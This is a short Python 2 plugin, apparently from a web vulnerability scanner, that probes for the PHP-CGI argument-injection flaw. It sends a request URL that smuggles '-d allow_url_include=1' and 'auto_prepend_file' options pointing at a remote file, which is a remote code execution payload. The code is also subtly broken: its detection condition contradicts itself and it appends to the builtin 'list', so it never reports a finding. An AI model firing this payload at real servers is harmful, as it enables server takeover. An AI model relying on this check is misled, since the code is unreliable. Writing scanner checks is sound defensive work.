#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    try:  
        result=[]                               
        detail=""
        detail=detail.encode('utf8')
        domain=ob['domain']
        url="%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        #expurl="%s://%s/?-s"%(ob['scheme'],domain)
        expurl2="%s://%s/?-d+allow_url_include%%3d1+-d+auto_prepend_file%%3d%s+-n"%(ob['scheme'],domain,ob['rfi_url'])
          
        response,content=requestUrl(http,url,ob['task_id'],ob['domain_id'])
    
        #response1,content1=requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        response2,content2=requestUrl(http,expurl2,ob['task_id'],ob['domain_id'])
        if content.find(ob['rfi_keyword'].encode('utf8'))<0 and content.find(ob['rfi_keyword'].encode('utf8'))>=0:
            
            request = getRequest(expurl2)
            response = getResponse(response2)
            list.append(getRecord(ob,expurl2,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:phpcgirecscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpcgirecscript.py, run_domain function :" + str(e))
    return result